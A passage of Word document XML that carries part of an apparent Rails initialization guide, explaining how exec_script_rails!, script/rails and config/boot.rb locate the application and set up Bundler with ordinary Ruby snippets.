          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>bin_dir</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ruby_install_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> values for the configuration which together form the path to the Ruby interpreter. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>RbConfig::CONFIG["EXEEXT"]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will suffix this path with “.exe” if the script is running on Windows. This constant is used later on in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>exec_script_rails!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. As for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SCRIPT_RAILS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant, we’ll see that when we get to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_rails_application?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A5B032" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Back in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/cli</w:t>
      </w:r>
      <w:r>
        <w:t>, the next line is this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4A2FDD98" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33652457" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2142838167"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails::ScriptRailsLoader.exec_script_rails!</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2954EEB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method is defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/script_rails_loader</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FEF8C5B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A564B1B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.exec_script_rails!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B8C0AE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  cwd = Dir.pwd</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6689F276" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  return</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>in_rails_application? || in_rails_application_subdirectory?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="552796D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  exec RUBY, SCRIPT_RAILS, *ARGV</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>in_rails_application?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AD1DD17" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Dir.chdir("..") do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="101B9D4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # Recurse in a chdir block: if the search fails we want to be sure</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E6DE2F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # the application is generated in the original working directory.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28A82732" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    exec_script_rails! unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>cwd == Dir.pwd</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55F4755D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E476693" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SystemCallError</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3436DD8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # could not chdir, no problem just return</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37DE8DB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53E867F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method will first check if the current working directory (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cwd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) is a Rails application or a subdirectory of one. This is determined by the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_rails_application?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="70D285A3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15E9073C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.in_rails_application?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27C74B7C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  File.exists?(SCRIPT_RAILS)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23A7A0DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="575DB221" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SCRIPT_RAILS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant defined earlier is used here, with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>File.exists?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> checking for its presence in the current directory. If this method returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in_rails_application_subdirectory?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will be used:</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A9C28BD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="408775D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.in_rails_application_subdirectory?(path = Pathname.new(Dir.pwd))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27C017B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  File.exists?(File.join(path, SCRIPT_RAILS)) || !path.root? &amp;&amp; in_rails_application_subdirectory?(path.parent)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F599455" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53D3CCC6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This climbs the directory tree until it reaches a path which contains a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>script/rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file. If a directory containing this file is reached then this line will run:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6455"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2FF0A9D2" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F63BA57" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1926570182"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>exec RUBY, SCRIPT_RAILS, *ARGV</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>in_rails_application?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3EAFADD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is effectively the same as running </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ruby script/rails [arguments]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, where </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>[arguments]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> at this point in time is simply “server”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74ACCEB2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>script/rails</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24826858" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This file is as follows:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7968"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="652AF784" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39E9BE2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>APP_PATH</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= File.expand_path('../../config/application',  __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5731A5C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require File.expand_path('../../config/boot',  __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26B0BC0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rails/commands'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C667705" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>APP_PATH</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant will be used later in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/commands</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/boot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file referenced here is the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/boot.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file in our application which is responsible for loading Bundler and setting it up.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F0BC27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/boot.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6F0CFE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/boot.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> contains this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="76364962" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E524A88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rubygems'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36023094" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D0E6A45" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># Set up gems listed in the Gemfile.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D0F9DFF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gemfile = File.expand_path('../../Gemfile', __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B2D4409" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>begin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7297E59B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ENV['BUNDLE_GEMFILE'] = gemfile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4850716E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  require 'bundler'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="511C6832" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Bundler.setup</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49D61AD5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Bundler::GemNotFound =&gt; e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35D040F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  STDERR.puts e.message</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1158E035" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  STDERR.puts "Try running `bundle install`."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="199E05A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  exit!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E4ACA0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>File.exist?(gemfile)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1BAA2DB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In a standard Rails application, there’s a </w:t>
      </w:r>
